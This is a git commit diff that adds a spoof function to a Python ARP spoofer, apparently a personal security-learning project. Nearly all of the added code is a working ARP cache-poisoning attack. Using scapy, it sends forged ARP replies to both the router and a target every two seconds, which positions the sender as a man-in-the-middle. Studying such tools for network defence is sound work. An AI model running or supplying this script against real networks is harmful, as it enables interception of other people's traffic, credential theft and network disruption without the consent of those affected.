3613a9b5a6053a088cd6a7f47c12a779a7d72000
Juhi S Iyer <juhiiyer@gmail.com>
2021-10-16 15:17:08 +0530

    add spoof function
    didnt work as primary hardwire connection was down

--- security/arpspoofer/arpspoofer.py
+++ security/arpspoofer/arpspoofer.py
@@ -13,5 +13,16 @@ router_ip = str(sys.argv[1])
 target_mac = str(get_mac_address(target_ip))
 router_mac = str(get_mac_address(router_ip))
 
-print(router_mac)
-print(target_mac)
+def spoof(router_ip, target_ip, router_mac, target_mac):
+    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
+    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
+    scapy.send(packet1)
+    scapy.send(packet2)
+
+try:
+    while True:
+        spoof(router_ip, target_ip, router_mac,target_mac)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('Closing Arp spoofer')
+    exit(0)
